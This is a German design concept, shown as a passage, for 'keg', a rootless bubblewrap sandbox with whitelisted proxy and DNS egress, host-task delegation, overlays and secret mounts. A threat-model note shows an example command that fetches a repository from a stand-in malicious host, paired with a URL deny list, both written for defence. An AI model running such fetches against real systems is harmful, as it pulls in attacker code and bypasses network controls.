# keg — Kernel-isolated Execution with Gateways — Anwendungskonzept

> Eine konfigurierbare Go-Entwicklungs-Sandbox auf Basis von **bubblewrap** mit
> Zero-Trust-Netzwerk-Egress (Whitelist-Proxy + gefiltertes DNS) über
> unprivilegierte User Namespaces — ohne Root, ohne slirp4netns, ohne veth.

**Status:** Konzept · **Zielplattform:** Linux (Kernel ≥ 5.x, bwrap ≥ 0.11)

---

## 1. Ziel & Motivation

`keg` kapselt Entwicklungs- und Test-Workflows (Go, Java, Node, …) in einer
isolierten Sandbox. Die Zielumgebung hat ein **restriktives Netzwerk**
(CoreDNS-Filterung, HTTP(S)-Proxy mit SNI-Whitelist) — dieses Verhalten soll
lokal nachgebildet werden, sodass:

* Builds/Tests standardmäßig **offline** aus Warm-Caches laufen.
* Netzwerkzugriff nur über einen **kontrollierten Egress-Kanal** möglich ist,
  der Domain-Whitelisting durchsetzt (Deny-by-default).
* Host-abhängige Aufgaben (Container-Builds, Playwright, Git-Operationen)
  **transparent delegiert** werden können.
* Das alles per **deklarativer YAML pro Repository** konfigurierbar ist —
  kein projekt-spezifisches Shell-Scripting mehr.

### Abgrenzung zum Bestand (`dist/sandbox`)

| | Bestehende Sandbox (`run-sandbox.sh`) | keg (Ziel) |
|---|---|---|
| Orchestrator | Bash-Skript (~550 Zeilen) | Ein einziges Go-Binary |
| Netzwerk | `--share-net`, Proxy-Variablen vom Host geerbt oder entfernt | `--unshare-net`, Egress ausschließlich über Socketpair-Proxy |
| DNS | Host-DNS bzw. blockiert | Eingebetteter, whitelistender DNS-Server |
| Delegation | Python-Daemon (`host_runner.py`) | In Go integriert (gleiches Protokoll-Muster) |
| Toolchain-Mounts | Hartkodiert für Go | Templates: `go`, `java`, `node`, … |
| Konfiguration | Flags im Skript | `.keg.yaml` im Repo |

---

## 2. Grundlagen aus den Vorarbeiten

### 2.1 Verifizierte Bubblewrap-Fähigkeiten (Zielsystem, bwrap 0.11.0)

Der Feature-Test auf dem Zielsystem war zu **100 % erfolgreich**:

* Unprivilegierte User Namespaces ✓ (kein SUID, kein Root nötig)
* Bind-Mounts ro/rw, `--dev-bind`, `proc`, `dev`, `tmpfs` (+ `--size`) ✓
* FD-basierte Datei-Injektion (`--bind-data`) ✓
* **Unprivilegiertes OverlayFS**: `--ro-overlay` (≥ 2 Sources),
  `--tmp-overlay`, persistentes RW-Overlay ✓ → Basis für Ephemeral-/Layer-Modi
* Security-Guardrails: `--disable-userns` (verhindert Nested-UserNS-Exploits),
  UID/GID-Mapping ✓

**Nicht in bwrap:** Netzwerkvirtualisierung. `--unshare-net` liefert nur ein
leeres Loopback-Interface. Virtuelle Netze (veth/NAT) erfordern Root bzw.
slirp4netns — genau hier setzt der Socketpair-Ansatz an.

### 2.2 pwpeer-Pattern (Referenz-Architektur)

`dist/pwpeer` zeigt das Muster für kontrollierten Egress aus einer isolierten
NetNS, das keg übernimmt:

1. **`syscall.Socketpair(AF_UNIX, SOCK_STREAM)`** auf dem Host erzeugen.
2. Ein Ende wird dem Sandbox-Prozess als **geerbter FD** mitgegeben.
3. Über die Socketpair-Verbindung läuft **muxado** (Stream-Multiplexing):
   beliebig viele parallele logische Streams über *einen* FD.
4. Host-Seite terminiert die Streams (Proxy/DNS), Guest-Seite exponiert sie
   lokal (Loopback).
5. **`reexec`** (`github.com/moby/sys/reexec`) startet dasselbe Binary neu —
   einmal als Host-Daemon, einmal als Sandbox-Entrypoint.

Vorteile: komplett im Userspace, keine Root-Rechte, keine Kernel-Netz-Objekte,
sauberes Lifecycle-Management (Sandbox-Exit ⇒ FD schließt ⇒ Daemon beendet sich).

---

### 2.3 Abgrenzung: pasta/passt vs. Socketpair-Kanäle

[pasta](https://passt.top) (Nachfolger von slirp4netns, Standard bei rootless
Podman) löst auf den ersten Blick dasselbe Problem: unprivilegiertes Netzwerk
für einen Namespace. Die Architekturen verfolgen aber gegensätzliche Ziele:

| | **pasta** | **keg-Kanäle (A–E)** |
|---|---|---|
| Philosophie | „Gib mir ein Netz“ — transparenter IP-Stack per Tap-Device | „Gib mir kontrollierte Löcher“ — keine L3/L4-Konnektivität, nur explizite Kanäle |
| Policy-Ebene | L3/L4: IPs, Ports, Pakete — FQDN-Filterung nur indirekt (DNS→IP-Mapping, brüchig bei CDNs/geteilten IPs) | L7: Domain-/CONNECT-Ziele, DNS-Namen — exakt das SNI-Whitelist-Modell der Zielumgebung |
| Protokolle | TCP + UDP + ICMP, beliebige Raw-Sockets, HTTP/3/QUIC, mDNS | Nur was als Kanal implementiert ist: HTTP(S)-Proxy, DNS, Port-Rückkanal, Runner, Control |
| Proxy-Variablen nötig? | Nein (transparent) | Ja — gewollt: Tools, die `HTTP_PROXY` ignorieren, laufen bewusst ins Leere |
| Audit | Flows/IPs (Domain-Zuordnung verloren) | Jede Entscheidung als Domain-Event (`ERLAUBT`/`BLOCKIERT`) |
| Externe Dependency | pasta-Binary (eigene Angriffsfläche im Netz-Pfad) | keine — Kernel + Go-Stdlib + muxado |
| Isolation der Sandbox selbst | Namespace hat reale IP/Gateway/Routen | Nur Loopback — kein Interface, kein Routing, nichts zu missbrauchen |

**Fazit:** pasta würde die Kernziele von keg konterkarieren. Das System
bildet ja gerade die restriktive Umgebung (CoreDNS + SNI-Proxy) nach —
pasta liefert dagegen maximale Transparenz und würde die Deny-by-default-
Invarianten (THREAT_MODEL §8) aushebeln. Für UDP-Outbound oder
proxy-resistente Tools gibt es absichtlich keinen stillen Fallback.

**Wo pasta doch Sinn ergibt (mögliche Zukunftsoption):** Als expliziter
Opt-in-Downgrade `network.mode: pasta` für einzelne Aufgaben mit echtem
Bedarf an UDP/ICMP/Raw-TCP (HTTP/3-Tests, Service-Discovery/mDNS,
Ping-Checks). Der Modus müsste dann:

* pro Lauf deklariert und sichtbar sein („⚠︎ Netzwerk-Policy herabgestuft“),
* ohne die L7-Whitelist laufen (klar dokumentiertes Residualrisiko),
* Port-Rückkanäle weiterhin nur auf 127.0.0.1 binden.

**Leichtgewichtigere Alternative für den häufigsten Fall:** Statt eines
ganzen IP-Stacks genügt oft ein generischer **TCP-Relay-Kanal** (Erweiterung
von Kanal A): erlaubte `host:port`-Paare aus einer neuen Whitelist-Sektion
(`network.allowed_endpoints`) werden über muxado durchgereicht — Raw-TCP
zu definierten Zielen, ohne pasta und ohne Aufweichung des Deny-by-default.

## 3. Gesamtarchitektur

```
┌──────────────────────────────────── HOST ────────────────────────────────────┐
│                                                                              │
│  keg (Go-Binary, Aufruf #1 — Orchestrator)                               │
│    ├─ liest .keg.yaml                                                    │
│    ├─ erzeugt Socketpairs:  [A] Proxy   [B] DNS   [C] Runner                 │
│    ├─ startet interne Daemons (Goroutinen):                                  │
│    │    ├─ Egress-Proxy      ← muxado-Server  [A]                            │
│    │    ├─ DNS-Server        ← UDP/TCP-Framing [B]                           │
│    │    └─ Runner-Daemon     ← JSON-RPC/Length-Prefix [C]                     │
│    └─ exec: bwrap … -- --self reexec-in-sandbox <cmd>                        │
│                    │  (ExtraFiles: FD 3=A, FD 4=B, FD 5=C)                   │
│  Restriktive Umgebung: CoreDNS + HTTP-Proxy (SNI-Whitelist)                  │
│    ▲ Egress-Proxy dialt selbst über Upstream-Proxy des Hosts                 │
└────────────────────────────┬─────────────────────────────────────────────────┘
                             │  bwrap: --unshare-all --disable-userns
                             │  binds: repo (rw/overlay), Toolchain-Caches,
                             │         injiziertes /etc/resolv.conf
┌────────────────────────────▼─────────────── SANDBOX ─────────────────────────┐
│  keg (Aufruf #2, CODE_KEG=1 — Entrypoint)                            │
│    ├─ startet Guest-Bridge (muxado-Client, FD 3)                             │
│    │    → lauscht 127.0.0.1:18081  (HTTP/HTTPS-CONNECT-Proxy)                 │
│    ├─ startet DNS-Bridge (FD 4)                                              │
│    │    → lauscht 127.0.0.1:53 (UDP+TCP)                                     │
│    ├─ Runner-Socket liegt unter /run/keg/runner.sock (FD 5)               │
│    └─ exec <cmd>  (Default: interaktive Bash)                                │
│                                                                              │
│  go test ./...  ── HTTP_PROXY=127.0.0.1:18081 ──► Bridge ══ FD 3 ══► Egress    │
│  DNS-Queries (resolv.conf → 127.0.0.1)          Bridge ══ FD 4 ══► DNS       │
│  just delegate container-build                  Client ══ FD 5 ══► Runner    │
└──────────────────────────────────────────────────────────────────────────────┘
```

**Kernprinzip:** Die Sandbox besitzt **nur Loopback**. Jeglicher Traffic muss
physisch durch einen der drei Socketpair-Kanäle — dort greift Deny-by-default.

---

## 4. Komponenten

### 4.1 keg-Orchestrator (CLI, Host-Seite)

Ein Multi-Call-Binary (`cmd/keg`), gesteuert über Env-Flag statt Subcommand:

```
Host:    $ keg [--config .keg.yaml] [--ephemeral|--disk-overlay N] [-- <cmd…>]
Sandbox: intern via reexec; erkennt sich an CODE_KEG=1
```

Aufgaben beim Start (Modell B „App-first“ — die Go-Anwendung steuert bwrap,
kein umliegendes Shell-Skript):

1. `.keg.yaml` laden, validieren, Templates auflösen.
2. Drei Socketpairs erzeugen; Daemons als Goroutinen starten.
3. bwrap-Argumentliste dynamisch aufbauen (Basis-Binds + Template-Mounts +
   Custom-Mounts + Overlay-Modus).
4. Sich selbst per `reexec.Command` **in** bwrap starten, Socket-Enden via
   `cmd.ExtraFiles` vererben.
5. Cleanup via Signal-Handling: Daemon-Jobs killen, Temp-Dirs entfernen
   (`--die-with-parent` in bwrap als Rückfallebene).

### 4.2 Egress-Proxy (Host-Seite, Kanal A)

HTTP/CONNECT-Proxy mit zweistufiger Filterung:

1. **Domain-Check** gegen Whitelist aus der YAML (exakt + `*.domain.tld`).
   Ablehnung ⇒ `403 Forbidden` inklusive sichtbarem Grund.
2. **Upstream-Weiterleitung**: Verbindung zum Ziel über den restriktiven
   Firmen-Proxy (`CONNECT host HTTP/1.1` → Prüfung auf `200`), alternativ
   direkt. Damit bildet keg das SNI-whitelistende Verhalten der Ziel-
   umgebung lokal ab und fügt die *eigene*, feinere Repo-Whitelist darüber.

Plain-HTTP-Requests werden ebenso behandelt (Header-Host prüfen, Request
weiterleiten). Tunneling anschließend vollduplex (`io.Copy` in beiden
Richtungen). Alle Entscheidungen werden geloggt (`ERLAUBT`/`BLOCKIERT`),
was die Whitelist iterativ vervollständigen hilft.

### 4.3 Guest-Bridge (Sandbox-Seite, Kanal A)

Nimmt auf `127.0.0.1:18081` HTTP/HTTPS-Proxy-Requests entgegen, öffnet je
Request einen muxado-Stream und piped 1:1 zum Host-Proxy. Kein Parsing,
keine Logik — die Policy liegt vollständig auf der Host-Seite.

Der Port liegt bewusst **nicht** auf 8080 (und generell außerhalb des
üblichen Dev-Server-Bereichs 3000–9999): Der Bridge-Listener belegt den
Sandbox-Loopback exklusiv, ein Dev-Server des Workloads auf 8080 würde
sonst beim Binden scheitern.

Die Sandbox-Umgebung erhält:

```
HTTP_PROXY=http://127.0.0.1:18081  HTTPS_PROXY=http://127.0.0.1:18081
http_proxy=…                       https_proxy=…
NO_PROXY=localhost,127.0.0.1
GOTOOLCHAIN=local                  (Template go; kein Toolchain-Download)
```

### 4.4 DNS-Server (Kanäle B)

Eingebettete Lösung mit `github.com/miekg/dns` (CoreDNS-Kernbibliothek) —
kein externes CoreDNS-Binary nötig. Reihenfolge der Auflösung:

1. **Statische `hosts`-Mappings** aus der YAML — exakt oder als Wildcard
   (lokale Testdienste, Mock-Umgebungen):
   ```yaml
   dns:
     hosts:
       db.local.test: "127.0.0.1"          # exakt
       "*.svc.local.test": "127.0.0.1"     # Wildcard: api.svc.local.test, …
       "*.githubusercontent.com": "10.0.0.7"  # gezielt umlenken
   ```
   Match-Reihenfolge: **exakter Name zuerst**, dann die spezifischste
   Wildcard (längster Suffix-Treffer); `*.foo.tld` matcht `x.foo.tld`, aber
   NICHT `a.b.foo.tld` (kein Multi-Level-Splat) und nicht `foo.tld` selbst.
2. Whitelist-Prüfung; bei Treffer Forward an den konfigurierten Upstream-DNS
   (Firmen-CoreDNS). Bei Nicht-Treffer ⇒ **NXDOMAIN** (Deny-by-default).
   Ein Hosts-Mapping greift **vor** der Whitelist — es antwortet autoritativ
   und leitet ggf. bewusst um.

Transport: Die Bridge in der Sandbox lauscht auf UDP *und* TCP `127.0.0.1:53`;
Pakete werden über den Stream-Kanal framen-weise zum Host gereicht
(2-Byte-Length-Prefix gemäß RFC 1035 §4.2.2). Der Host-Proxy dialt die
Upstream-Antwort zurück.

> **Implementierungshinweis (Backpressure):** Socketpairs sind
> `SOCK_STREAM`, DNS-Clients erwarten aber UDP-Verhalten. Staut der Stream
> kurz (z. B. weil ein Upstream-Lookup dauert), darf die Bridge UDP-Pakete
> **nicht verwerfen**, sondern muss sie sauber queuen (je Query ein Frame,
> begrenzte Queue + Antwort-Timeout seitens des resolvers). Da Go-Resolver
> typischerweise sequenziell mit Retry arbeiten, genügt eine kleine,
> korrekt gesperrte Queue; ein Drop würde sich als sporadisches
> „server misbehaving“ äußern und ist schwer zu debuggen.

Injiziertes `/etc/resolv.conf`:

```
nameserver 127.0.0.1
options timeout:1 retries:1
```

> Hinweis: DNS ist bewusst **zweite Verteidigungslinie**. Auch wenn eine App
> IP-Literale direkt anspricht, scheitert das an `--unshare-net`; auch wenn
> sie den Proxy umgehen wollte, kennt sie nur Loopback.

### 4.5 Host-Runner / Delegation (Kanal C)

Übernahme des bewährten `host_runner.py`-Konzepts in den keg-Prozess:

* Daemon führt **ausschließlich whitelisted Tasks** aus, sonst Exit 126 mit
  Begründung.
* Live-Streaming von stdout/stderr, Übergabe des Exit-Codes.
* Pfad-Jail gegen `../`-Escapes, Jobs laufen im Host-Repo-Root.
* Jobs werden beim Sandbox-Exit (auch Ctrl+C/TERM) beendet.

#### Argument-Patterns für die Delegations-Whitelist

Die Whitelist kennt drei Regelklassen mit aufsteigender Komplexität —
alle deny-by-default, Ablehnung jeweils mit Exit 126 + sichtbarem Grund:

| Klasse | Match | Beispiel |
|---|---|---|
| `exact` | Task-Name exakt, ohne Argumente | `container-build` |
| `prefixes` | Task-Name als Präfix, Rest = Argumente | `test-playwright login.spec.ts` |
| `raw` | Argument-Pattern-Matcher für echte Host-Binarys | `git -C hub commit -m "…"` |

Der **Raw-Matcher** verallgemeinert das im Bestand bewährte Git-Pattern
(`host_runner.py: raw_match`) auf beliebige Tools und arbeitet so:

1. `argv[0]` muss dem konfigurierten `cmd` entsprechen (exakt).
2. Danach werden **globale Optionen übersprungen**, solange sie bekannt sind:
   * Einträge aus `opts_with_value` konsumieren ihr Folgeargument
     (`git -c user.email=… commit` → `-c` + Wert).
   * Einträge aus `flags` stehen einzeln (`git --no-pager status`).
   * Bei `allow_opt_value_form: true` gilt zusätzlich die selbstständige
     Form `--opt=value` als bekannt.
3. Das erste Argument, das keine bekannte globale Option ist, muss im
   `subcommands`-Set liegen. **Nur dann** ist der Befehl zugelassen.
4. Alles nach dem Subcommand wird gegen optionale
   `forbidden_args_matching`-Muster geprüft (Glob oder Regex, Match auf
   jedes Einzelargument); ein Treffer ⇒ Ablehnung.
5. Sonst wird der Rest **unverändert durchgereicht**
   (`git commit --amend`, mehrzeilige Commit-Messages via `b64:`-Framing).
   Insbesondere ist `git push` automatisch abgelehnt — es steht nicht im Set.

> ⚠️ **Warum Schritt 4 wichtig ist:** Delegierte Jobs laufen **auf dem Host,
> außerhalb der Sandbox-Netzwerk-Policy**. Ohne Argument-Constraints könnte
> eine kompromittierte Sandbox `git fetch https://malicious.example/pwn.git`
> delegieren und so den Egress-Kanal (Proxy/DNS-Whitelist) komplett umgehen.
> Argument-Patterns schließen genau diese Lücke:
>
> ```yaml
> raw:
>   - cmd: git
>     subcommands: [fetch, pull]
>     forbidden_args_matching:        # keine fremden URLs/Remotes
>       - "https://*"
>       - "http://*"
>       - "git@*"
>       - "ssh://*"
> ```

Damit lassen sich auch andere Host-Tools deklarativ freigeben, z. B.:

```yaml
raw:
  - cmd: podman
    subcommands: [build, push, images]
    opts_with_value: ["--format", "--platform"]
    flags: ["--no-cache"]
    allow_opt_value_form: true
```

Sicherheitsprinzipien bleiben wie im Bestand: Parameter reisen ausschließlich
als Job-**Argumente**, nie als Environment — es fließt keine Sandbox-Umgebung
auf den Host; der Daemon läuft im Kontext des aufrufenden Users und erbt
dessen Umgebung. Zusätzlich gilt: Delegierte Jobs laufen **außerhalb der
Sandbox-Netzwerk-Policy** — Raw-Regeln für netzwerkrelevante Tools (git,
podman, curl, …) sollten daher stets `forbidden_args_matching` setzen, die
fremde URLs/Endpunkte blockieren.

In Justfiles bleibt das Erkennungs-/Delegationsmuster unverändert
(`CODE_SANDBOX`-Kompatibilität wird beibehalten):

```just
if [ "{{in_sandbox}}" = "1" ]; then
  just delegate container-build
  exit $?
fi
```

Werden in `.keg.yaml` Just-Tasks delegiert (`delegated_tasks.exact` oder
`delegated_tasks.prefixes`) oder zusätzliche Dateien in `trust_anchors`
definiert, merkt sich das Trust-Gate neben der `.keg.yaml` alle
zugehörigen Trust-Anchor-Dateien (wie das `justfile`, `Makefile`, Build-Scripts etc.)
in der Trust-Datei (`trust.yaml`). Dadurch werden unbemerkte Änderungen an Rezepten
oder Skripten, die außerhalb der Sandbox auf dem Host ausgeführt werden,
zuverlässig erkannt und blockiert.

### 4.6 Mounts, Overlays & Templates

#### Basis-Binds (immer)

| Quelle | Ziel | Modus |
|---|---|---|
| `/usr` | `/usr` | ro |
| `/bin`,`/lib`,`/lib64` | Symlinks nach `usr/…` | – |
| `/etc/alternatives` | ro (Linker für CGO) | ro |
| `/etc/ssl/certs` | ro | ro |
| `$PWD` (Repo) | `$PWD` | rw (oder Overlay, s. u.) |
| – | `/tmp` | tmpfs |
| – | Sandbox-HOME | tmpfs |
| injiziertes resolv.conf | `/etc/resolv.conf` | ro |

Isolation: `--unshare-all --die-with-parent --disable-userns`,
`TMPDIR=/tmp` erzwungen, Proxy-Variablen des Hosts werden **nie** geerbt
(nur die Sandbox-internen gesetzt).

#### Overlay-Modi (bwrap ≥ 0.11, nativ verifiziert)

| Modus | Effekt |
|---|---|
| Default | Repo rw gebunden |
| `--ephemeral` | Unsichtbares tmpfs-Upper über `$PWD` — Lauf werfbar, `git status` jungfräulich |
| `--disk-overlay NAME` | Persistenter Layer auf Disk — Agenten-Läufe diff-fähig, überlebt Exit |
| `--isolate-caches` / `--isolated-cache-name NAME` | Cache lesen aus Warm-Cache, Schreibzugriffe in (persistente) Upper-Schicht — Host-Cache bleibt sauber |

#### Sprach-Templates (builtin)

Vordefinierte Env+Mount-Sets, damit Kaltstarts offline funktionieren und der
Warm-Cache gepflegt wird:

| Template | Env | Mounts (Host → Sandbox) |
|---|---|---|
| `go` | `GOTOOLCHAIN=local`, `GOMODCACHE=/sandbox-home/.cache/go/mod`, `GOCACHE=…/build` | `$(go env GOMODCACHE)` → mod (rw oder Overlay), `$(go env GOCACHE)` → build |
| `java` | `MAVEN_OPTS=-Dmaven.repo.local=/sandbox-home/.m2/repository` | `~/.m2` → `/sandbox-home/.m2` (rw) |
| `node` | `npm_config_cache=/sandbox-home/.npm` | `~/.npm` → rw |
| `python` | `PIP_CACHE_DIR=/sandbox-home/.cache/pip` | `~/.cache/pip` → rw |

Templates sind additive Bausteine; mehrere pro Sandbox erlaubt.

#### Implementierungshinweise aus dem Bestand

* **OverlayFS & Cache-Rechte:** Bei persistenten Upper-/Workdirs auf Disk
  (`--disk-overlay`, `--isolated-cache-name`) muss keg die Verzeichnisse
  mit `mkdir -p` so anlegen, dass sie zur UID des isolierten Namespaces
  kompatibel sind (im Bestand bereits gelöst: Owner bleibt der aufrufende
  User; bwrap legt Overlay-`work`-Dirs mit Mode 000 an — die Stufen-Lösch-
  logik des Layer-Managements berücksichtigt das).
* **CGO/Linker-Erreichbarkeit:** Mit CGO sucht `gcc` nach `as` und `ld`.
  Der ro-Bind von `/etc/alternatives` ist dafür zwingend; zusätzlich muss
  beim Start geprüft werden, ob `/usr/bin/as` bzw. `/usr/bin/ld` über den
  `/usr`-Bind und die Symlinks erreichbar sind — fehlt eines, klare
  Fehlermeldung statt kryptischem `collect2: cannot find 'ld'`.

### 4.7 Secret-Bind-Mechanismus (`/run/secrets`)

Für langlebige Sandboxes reicht ein einmalig injizierter Secret-Wert nicht:
Tokens laufen ab, Zertifikate rotieren. Der Secret-Bind-Mechanismus mountet
Secrets daher als **Dateien unter `/run/secrets/<NAME>`** — im Stil von
Docker/Kubernetes-Secrets — und aktualisiert deren Inhalt **periodisch auf
dem Host**.

#### Aufteilung der Ebenen (konsistent zu §4.8/§5)

* **User-Config** definiert den *Mechanismus* — woher der Wert kommt und
  wie oft er refreshed wird:
  ```yaml
  # ~/.config/keg/config.yaml
  secret_sources:
    ai_token:
      cmd: [op, read, "op://Vault/AI/token"]
      interval: 5m          # Refresh-Intervall auf dem Host
      timeout: 10s
      on_refresh_error: keep   # keep = letzter guter Wert bleibt (Default)
                               # fail = Sandbox wird beendet
      always: true          # optional: in JEDE Sandbox einspielen (s. u.)
  ```
  Alternativ (oder ergänzend) erlaubt die User-Config, **bestehende
  Host-Dateien direkt als Secret bereitzustellen**:
  ```yaml
  secrets:
    ai_token: "~/.config/ai/token"   # Host-Datei (ro-bind)
  ```
  Die Datei wird per `--ro-bind` auf `/run/secrets/<name>` gemountet —
  kein Kopieren, kein Befehlsaufruf; `~`/`$VAR` werden expandiert.
  Auflösung je Name: **genau eine** Quelle — ein Name darf nicht in
  `secret_sources` UND `secrets` gleichzeitig existieren (harte Validierung,
  sonst Mehrdeutigkeit bei Rotation). Path-Secrets werden nicht refresht;
  die Bindung zeigt immer auf die aktuelle Datei.
* **Repo-YAML** deklariert nur den *Bedarf* — welche Secrets die Sandbox
  braucht und ob zusätzlich eine Env-Var darauf zeigen soll:
  ```yaml
  secrets:
    - name: ai_token         # -> /run/secrets/ai_token
    - name: db_password
      env: DB_PASSWORD_FILE  # setzt DB_PASSWORD_FILE=/run/secrets/db_password
                             # (kompatibel zum *_FILE-Konvent vieler Tools)
  ```
  Referenzierte `name`s müssen in `secret_sources` oder in der `secrets`
  -Map (Host-Datei) der User-Config existieren, sonst harter Validierungsfehler
  vor Start.

#### Wie wird ein Secret „aktiviert“? (drei Wege)

Der Bedarf (welche Secrets die Sandbox erhält) und der Mechanismus (woher der
Wert stammt) sind bewusst getrennt. Ein in der User-Config definiertes Secret
wird erst dann gemountet, wenn *irgendeine* der folgenden Quellen es verlangt:

1. **Repo-`.keg.yaml`** — portabel, da versioniert und mitgeteilt:
   ```yaml
   secrets:
     - name: ai_token
       env: AI_TOKEN_FILE
   ```
2. **`repos[<match>].secrets` in der User-Config** — maschinenlokal für genau
   dieses Ziel-Repo, ohne das Repo anfassen zu müssen. Die Liste wird als
   *Zusatzbedarf* mit den Deklarationen der Repo-YAML vereinigt:
   ```yaml
   repos:
     "/home/code/agent-repo":
       secrets:
         - name: ai_token
           env: AI_TOKEN_FILE
   ```
3. **`always: true` in `secret_sources`** — global: das Secret wird in **jede**
   Sandbox auf dieser Maschine eingespielt, unabhängig davon, ob irgendeine
   Repo-Konfiguration den Bedarf deklariert. Ideal für maschinenweit gültige
   Zugangs-Tokens (genkey, OAuth-Refresh …). Ein `always`-Eintrag wird wie die
   übrigen Quellen refresht und landet unter `/run/secrets/<name>`; die
   `secrets:`-Map (Host-Dateien) kennt kein `always`.

   ```yaml
   secret_sources:
     ai_secret_key:
       cmd: [genkey, keg, "1500"]
       interval: 10m
       always: true        # -> /run/secrets/ai_secret_key in JEDER Sandbox
   ```

#### Ablauf & Technik

1. **Initial-Fetch:** Vor bwrap-Start läuft jedes `cmd` einmal; Fehler ⇒
   Sandbox startet nicht.
2. **Instanz-Verzeichnis:** Werte landen in `<tmp_base>/keg-<inst>/secrets/`
   (Dateimode `0400`, Dir `0700`). Schreiben erfolgt **atomar**
   (Temp-Datei + `rename()` im selben Verzeichnis).
3. **Mount:** bwrap bekommt das *gesamte Verzeichnis* als
   `--ro-bind <secretdir> /run/secrets` — bewusst NICHT Einzeldateien:
   ein File-Bind würde die alte Inode pinnen und Updates unsichtbar machen.
   Über den Directory-Bind sieht die Sandbox jeden atomaren Tausch sofort.
4. **Refresher-Goroutine:** Auf dem Host tickt je Secret ein Timer mit
   `interval`; bei jedem Lauf wird `cmd` erneut ausgeführt und bei ge-
   änderter Ausgabe atomar getauscht. Gleichbleibender Inhalt ⇒ kein Write
   (kein unnötiger mtime-Churn).
5. **Lifecycle:** Die Refresher leben im keg-Prozess und enden mit
   der Sandbox — keine verwaisten Timer, keine Secrets-Reste auf Platte
   (Cleanup löscht das Instanz-Verzeichnis).
6. **In-App-Konsum:** Programme lesen die Datei bei Bedarf neu (`_FILE`
   -Konvention) oder nutzen `env:`-Vars für den Initial-Wert — Letztere
   sind nach einem Refresh naturgemäß veraltet; dafür ist der Dateipfad
   da.

#### Sicherheitsregeln

* Secret-Inhalte fließen **nie** durch Template-/Vars-Kontext oder Logs —
  Audit-Log führt nur „refreshed ai_token (changed|unchanged|error)“.
* Werte werden nie über argv/Env an andere Host-Prozesse gereicht, nur
  über die Dateien.
* Innerhalb der Sandbox gilt die normale Isolation weiter: `/run/secrets`
  ist ro; der Abruf des Secret-Managers läuft vollständig auf dem Host,
  außerhalb der Sandbox-Netzwerk-Policy.
* Abgrenzung zu `vars_from_exec`: Statische Einmalwerte (auch für Mount-
  Pfade/Env nötig) bleiben dort; `secret_sources` ist ausschließlich für
  periodisch refreshbare Datei-Secrets.

### 4.8 User-Config: `~/.config/keg/config.yaml`

Maschinenspezifische Einstellungen — insbesondere lokale Pfade und
lokal zusätzliche Freigaben — leben in einer optionalen User-Config nach
XDG-Konvention: `$XDG_CONFIG_HOME/keg/config.yaml` (Default
`~/.config/keg/config.yaml`). Fehlt die Datei, greifen die Built-in
Defaults.

#### Zwei Ebenen: global und pro Ziel-Repo

Die User-Config kennt zwei Bereiche:

* **Global** (`paths`, `runner`, `log` auf Top-Level): gilt für alle
  Sandboxes auf dieser Maschine.
* **Pro Repo** (`repos:`-Map): Schlüssel ist der Repo-Pfad (realpath) oder
  ein Glob-Muster; die Werte haben dieselbe Struktur wie der Global-Bereich
  und übersteuern diesen **nur für dieses Ziel-Repo**.

```yaml
# ~/.config/keg/config.yaml — maschinenlokale Pfade & Preferences

# ── Global: Default für alle Repos auf dieser Maschine ─────────────────
paths:
  # Basis für persistente Overlay-Layer (--disk-overlay,
  # --isolated-cache-name). Struktur darunter identisch zum Default:
  #   <base>/<name>/{rw,work}
  #   <base>/cache-<name>/{mod,build}-{rw,work}
  storage_base: /var/lib/containers/storage/sandbox   # <- Default

  # Ablage für instanzbezogene Temp-Daten (Runner-Sockets, injiziertes
  # resolv.conf, ephemere Upper-Layer); je Instanz ein Unterordner
  tmp_base: /tmp                                      # <- Default

  # Optional: explizite Cache-Quellen überschreiben die automatische
  # Erkennung (go env GOMODCACHE, ~/.m2, ~/.npm …)
  go_mod_cache: ""        # leer = auto
  go_build_cache: ""

runner:
  just_bin: just          # `just`-Binary für delegierte Tasks
  extra_exact: []         # zusätzliche Freigaben (global)
  extra_prefixes: []
  extra_raw: []           # gleiche Raw-Regeln wie in .keg.yaml, merged

# Variablen für die Template-Ersetzung in .keg.yaml (s. §5):
# übersteuern die Repo-Defaults maschinen- bzw. repospezifisch.
vars:
  mock_data: /data/big-mock     # z. B. für mounts: src "{{ .Vars.mock_data }}"

template_env:
  allow_env: true         # false => {{ .Env.* }} in Repo-Templates hart ablehnen

# Dynamische Variablen per Host-Command (z. B. Secret-Manager). Werden vor
# dem bwrap-Start einmalig ausgeführt und als normale Vars in den gemergten
# `vars:`-Namespace eingespeist — Repo-Templates referenzieren sie nur
# noch via {{ .Vars.<name> }}. `exec` gibt es bewusst NICHT als Template-
# Funktion in der Repo-YAML; dieser Abschnitt ist die EINZIGE Stelle, an
# der keg Programme zur Werte-Beschaffung startet.
vars_from_exec:
  ai_token:
    cmd: [op, read, "op://Vault/AI/token"]
    cache: session        # session (Default) | none
    timeout: 10s

security:
  allow_weak_bwrap: false # true erst erlaubt Isolation-schwächende
                          # bwrap_args (--share-net, --dev-bind /, …)

log:
  audit_file: ""          # optional: Allow/Deny-Entscheidungen hier appenden

# Secret-Quellen für den /run/secrets-Bind-Mechanismus (§4.7):
# periodisch auf dem Host gecallte Programme, deren Ausgabe als Datei
# in der Sandbox landet. Repo deklariert nur den Bedarf (`secrets:`).
secret_sources:
  ai_token:
    cmd: [op, read, "op://Vault/AI/token"]
    interval: 5m          # Refresh-Intervall; fehlt = nur Initial-Fetch
    timeout: 10s
    on_refresh_error: keep   # keep (Default) | fail

# Bestehende Host-Dateien als Secrets bereitstellen (§4.7): ro-bind auf
# /run/secrets/<name>. Repo deklariert nur den Bedarf (`secrets:`);
# Name darf nicht gleichzeitig in secret_sources existieren.
secrets:
  github_pat: "~/.config/gh/hosts.yml"

# ── Pro Ziel-Repo: übersteuert den Global-Bereich selektiv ──────────────
repos:
  "/home/coder/dev/llmgate":            # exakter realpath …
    paths:
      storage_base: /data/sandbox-layers
    runner:
      extra_exact: [k8s-deploy]
      extra_raw:
        - cmd: podman
          subcommands: [build, push, images]
          opts_with_value: ["--format", "--platform"]
          allow_opt_value_form: true

  "~/work/*":                           # … oder Glob-Muster
    paths:
      tmp_base: /var/tmp/keg
    vars:
      mock_data: /var/work/mock-data   # nur für diese Repos anders
```

**Matching-Regeln für `repos:`:**

1. Zuerst exakter Match gegen den realpath des Repo-Roots;
2. sonst der **spezifischste** Glob-Treffer (längster wörtlicher Präfix,
   Tiefe vor Breite); kein Treffer ⇒ nur der Global-Bereich gilt.
3. `~` und `$VARS` werden expandiert; Muster sind bewusst auf Pfade unter
   `$HOME` beschränkbar, müssen es aber nicht.

**Merge-Semantik pro Ebene** (global → repo-spezifisch):

